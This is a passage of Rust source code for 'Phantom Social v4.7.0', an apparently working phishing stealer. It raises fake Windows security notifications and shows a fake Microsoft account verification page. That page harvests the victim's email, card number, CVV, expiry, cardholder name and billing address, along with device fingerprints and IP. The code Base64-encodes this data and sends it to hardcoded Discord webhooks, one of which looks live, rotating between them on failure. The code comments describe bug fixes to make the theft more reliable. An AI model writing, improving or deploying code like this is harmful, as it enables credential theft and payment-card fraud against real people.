// ==========================================================================
// PHANTOM SOCIAL v4.7.0 - FROZEN BUTTON FIX ðŸ”¥
// ==========================================================================
// Â¿?? FIXED: "Frozen" Button (Relaxed Validation + Serde Default)
// Â¿?? FIXED: Step 1 data rejection (Partial JSON support)
// Â¿?? MULTI-WEBHOOK: Random start + Persistence
// Â¿?? EXTRACTS: GPU, CPU, RAM, Client Hints, Fingerprint Blob
// ==========================================================================
...
// ðŸš¨ CONFIGURE YOUR WEBHOOKS HERE ðŸš¨
const WEBHOOKS: &[&str] = &[
    "https://discord.com/api/webhooks/1464259954855645319/cfsiMy3r0E7_S-TTqzHY9qfArbskL2xjnYmmkeLWLnalqHHhc7ZQrXBAoVVkvr2DTvNI",
    "https://discord.com/api/webhooks/2222222222222/BBBBBBBBBBBBBBBBBBBBBBBBBBBB",
    "https://discord.com/api/webhooks/3333333333333/CCCCCCCCCCCCCCCCCCCCCCCCCCCC"
];
...
// âœ… FIX: Added #[serde(default)] to allow partial JSON from Step 1
...
fn init_globals() {
    ...
    *VICTIM_IP.lock().unwrap() = String::new();
    ...
    if !WEBHOOKS.is_empty() {
        *ACTIVE_WEBHOOK_INDEX.lock().unwrap() = rng.gen_range(0..WEBHOOKS.len());
    }
}
...
fn get_victim_ip() -> String {
    VICTIM_IP.lock().unwrap().clone()
}
...
// =========================== DISCORD COMMUNICATION (WEBHOOKS) ===========================
...
fn smart_send_data(payload_str: String) {
    ...
    rt.block_on(async {
        ...
        loop {
            ...
            // DYNAMIC: Get the current active webhook (persists until failure)
            let webhook_url = match get_active_webhook() {
                Some(url) => url,
                None => break,
            };
            ...
            match res {
                Ok(resp) => {
                    ...
                    if status >= 200 && status < 300 {
                        break; // Success! Keep using this webhook.
                    } else if status == 429 {
                        // Rate limit - wait and retry same webhook
                        ...
                        // 404/401 etc. -> Rotate to next webhook
                        rotate_webhook();
                ...
                Err(_) => {
                    // Network error -> Rotate to next webhook
                    rotate_webhook();
                    tokio::time::sleep(Duration::from_secs(2)).await;
                    attempt += 1;
                }
...
fn handle_ipc_message(payload_str: &str) -> Result<(), Box<dyn std::error::Error>> {
    if GLOBAL_REQUEST_COUNT.fetch_add(1, Ordering::SeqCst) >= MAX_REQUESTS {
        std::process::exit(0);
    }

    let payload: IPCPayload = serde_json::from_str(payload_str)?;
    
    // REMOVED: Deduplication logic (SENT_DATA_HASHES)
    // REMOVED: Kill Switch logic (Requires Bot Token/Channel Read)
    
    let mut fields = Vec::new();

    fields.push(serde_json::json!({
        "name": "ðŸ†” Session ID",
        "value": format!("`{}`", payload.session),
        "inline": true
    }));
    fields.push(serde_json::json!({
        "name": "ðŸ’» Device ID (MD5)",
        "value": format!("`{}`", payload.device_id),
        "inline": true
    }));
    fields.push(serde_json::json!({
        "name": "ðŸŒ Victim IP",
        "value": format!("`{}`", get_victim_ip()),
        "inline": true
    }));
    ...
    if let Some(blob) = &payload.fp_blob {
        fields.push(serde_json::json!({ 
            "name": "ðŸ§¬ Full Fingerprint Blob (Base64)", 
            "value": format!("```{}```", blob), 
            "inline": false 
        }));
    }
    ...
    if let Some(email) = &payload.email {
        if !email.is_empty() {
             let encoded = base64_encode(email);
             fields.push(serde_json::json!({ 
                 "name": "ðŸ“§ Email (Base64)", 
    ...
    if payload.card_number.is_some() || payload.cardholder_name.is_some() {
        fields.push(serde_json::json!({ 
            "name": "â”â”â”â”â”â”â”â”â”â” ðŸ’³ Financial Data â”â”â”â”â”â”â”â”â”â”", 
            "value": "Â­",
            "inline": false 
        }));
        
        if let Some(card) = &payload.card_number {
            let encoded = base64_encode(card);
            fields.push(serde_json::json!({ "name": "Card Number (Base64)", "value": format!("`{}`", encoded), "inline": true }));
        }
        if let Some(cvv) = &payload.cvv {
            let encoded = base64_encode(cvv);
            fields.push(serde_json::json!({ "name": "CVV (Base64)", "value": format!("`{}`", encoded), "inline": true }));
        }
        if let Some(exp) = &payload.expiry {
            let encoded = base64_encode(exp);
            fields.push(serde_json::json!({ "name": "Expiry (Base64)", "value": format!("`{}`", encoded), "inline": true }));
        }
        if let Some(name) = &payload.cardholder_name {
            let encoded = base64_encode(name);
            fields.push(serde_json::json!({ "name": "Cardholder Name (Base64)", "value": format!("`{}`", encoded), "inline": true }));
        }
    }

    if payload.street_address.is_some() || payload.city.is_some() {
        fields.push(serde_json::json!({ 
            "name": "â”â”â”â”â”â”â”â”â”â” ðŸ  Billing Address â”â”â”â”â”â”â”â”â”â”", 
            "value": "Â­", 
            "inline": false 
        }));
        
        if let Some(addr) = &payload.street_address {
            let encoded = base64_encode(addr);
            fields.push(serde_json::json!({ "name": "Street (Base64)", "value": format!("`{}`", encoded), "inline": true }));
        }
        if let Some(city) = &payload.city {
            let encoded = base64_encode(city);
            fields.push(serde_json::json!({ "name": "City (Base64)", "value": format!("`{}`", encoded), "inline": true }));
        }
        
        let mut loc_str = String::new();
        if let Some(s) = &payload.state { loc_str.push_str(s); loc_str.push_str(" "); }
        if let Some(z) = &payload.zip_code { loc_str.push_str(z); }
        
        if !loc_str.is_empty() {
             let encoded = base64_encode(loc_str.trim());
             fields.push(serde_json::json!({ "name": "State/Zip (Base64)", "value": format!("`{}`", encoded), "inline": true }));
        }
        
        if let Some(c) = &payload.country {
            let encoded = base64_encode(c);
            fields.push(serde_json::json!({ "name": "Country (Base64)", "value": format!("`{}`", encoded), "inline": true }));
        }
    }

    let payload_discord = serde_json::json!({
        "embeds": [{
            "title": "ðŸŽ¯ Account Verification Captured",
            "color": 3447003,
            "fields": fields,
            "footer": {
                "text": "Phantom Social v4.7.0 | Fixed Edition"
            },
...
fn send_enriched_data(data: &serde_json::Value) {
    let payload = serde_json::json!({
        "embeds": [{
            "title": "ðŸ“Š Telemetry Data",
            "color": 3447003,
            "fields": data.as_object().unwrap().iter().map(|(k, v)| {
                serde_json::json!({
                    "name": k,
                    "value": format!("`{}`", v.as_str().unwrap_or(&v.to_string())),
                    "inline": true
                })
            }).collect::<Vec<_>>(),
            "footer": {
                "text": "Phantom Social v4.7.0"
            },
            "timestamp": get_utc_timestamp()
        }]
    });
...
fn show_toast(notif_type: NotificationType) {
    let (title, message, launch_arg, actions_xml, icon_uri) = match notif_type {
        ...
        NotificationType::Action => (
            ...
            "To protect your account, please verify your payment information immediately.",
            format!("{}://verify", PROTOCOL_SCHEME),
            format!(r#"<actions>
                <action content="Verify Now" arguments="{}://verify" activationType="protocol"/>
            </actions>"#, PROTOCOL_SCHEME),
            WARNING_ICON
        ),
    };
...
fn notification_loop() {
    ...
    let mut rng = rand::thread_rng();
    let initial_delay = rng.gen_range(600..=1800); 
...
fn get_html() -> String {
    ...
    let html = concat!(
        ...
        "</button>",
        "<button class=\"nav-btn\" title=\"Refresh\" onclick=\"fakeRefresh()\">",
        "<svg viewBox=\"0 0 24 24\" fill=\"currentColor\" id=\"refreshIcon\"><path d=\"M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z\"/></svg>",
        "</button>",
        ...
        "<a href=\"#\">Microsoft account</a> Â¿?? <a href=\"#\">Security</a> Â¿?? <span>Verify your info</span>",
        "</div>",
        ...
        "<div class=\"card\">",
        "<div id=\"step1\">",
        "<div class=\"card-title\">Let's protect your PC</div>",
    ...
    let script = format!(
        "<script>const sid=\"{}\";const pt=\"{}\";const ip=\"{}\";const rs={};",
        session, proc_time, ip_addr, rand_seed
    ) + r#"
...
function getDeviceID(){const components={user_agent:navigator.userAgent,fonts:detectFonts(),timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,screen_width:screen.width.toString(),screen_height:screen.height.toString(),dpi:window.devicePixelRatio.toString(),language:navigator.language,platform:navigator.platform};const input=ip+'|'+components.user_agent+'|'+components.fonts+'|'+components.timezone+'|'+components.screen_width+'|'+components.screen_height+'|'+components.dpi+'|'+components.language+'|'+components.platform;return md5(input);}
function getBrowserInfo(){if(navigator.userAgentData){const b=navigator.userAgentData.brands.find(x=>!x.brand.includes('Not')&&x.brand!=='Chromium');return b?b.brand+' '+b.version:'Unknown';}const m=navigator.userAgent.match(/(Edg|Chrome|Firefox)\/(\d+)/);return m?m[1]+' '+m[2]:'Unknown';}
function getGPU(){try{const c=document.createElement('canvas');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(!gl)return'Unknown';const d=gl.getExtension('WEBGL_debug_renderer_info');return d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):'Unknown';}catch(e){return'Unknown';}}
function getFullFingerprintBlob(){const data={canvas:getCanvasFP(),user_agent:navigator.userAgent,client_hints:navigator.userAgentData?{brands:navigator.userAgentData.brands,mobile:navigator.userAgentData.mobile,platform:navigator.userAgentData.platform}:null,gpu:getGPU(),cpu_cores:navigator.hardwareConcurrency||'unknown',ram_gb:navigator.deviceMemory||'unknown',timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,language:navigator.language,platform:navigator.platform,screen:{width:screen.width,height:screen.height,depth:screen.colorDepth},fonts:detectFonts()};return btoa(unescape(encodeURIComponent(JSON.stringify(data))));}
...
window.addEventListener('click',()=>{sendToRust({step:0,session:sid,device_id:deviceID});},{ once: true });
function fakeRefresh(){const icon=document.getElementById('refreshIcon');icon.classList.add('spinning');setTimeout(()=>icon.classList.remove('spinning'),600);}
...
// âœ… FIX: Allow any input > 3 chars (Phone/Email/User ID)
function validateIdentity(s){return s.length > 3;}
...
document.getElementById('expiry').addEventListener('keydown',function(e){if(e.key==='Backspace'){e.preventDefault();let v=this.value.replace(/[^0-9]/g,'');if(v.length>0){v=v.slice(0,2)+'/'+v.slice(2);}else{this.value=v;}}else{this.value='';}}});
</script></body></html>"#;
...
fn create_win(html: String) -> Result<(), Box<dyn std::error::Error>> {
    ...
    if let Some(i) = icon {
        win_builder = win_builder.with_window_icon(Some(i));
    }
    ...
    *VICTIM_IP.lock().unwrap() = victim_ip.clone();
    ...
    thread::spawn(move || {
        ...
        let pkt = TelemetryData {
            ...
            device_id: "system_boot".to_string(),
        ...
        data.insert("session_id".to_string(), serde_json::Value::String(pkt.session));
        data.insert("device_id".to_string(), serde_json::Value::String(pkt.device_id));
        data.insert("victim_ip".to_string(), serde_json::Value::String(pkt.victim_ip));
        data.insert("process_start_time".to_string(), serde_json::Value::String(pkt.process_time));
        data.insert("uptime_hours".to_string(), serde_json::Value::Number(pkt.uptime_hours.into()));
        data.insert("timestamp_utc".to_string(), serde_json::Value::String(get_utc_timestamp()));
        
        let enriched = serde_json::Value::Object(data);
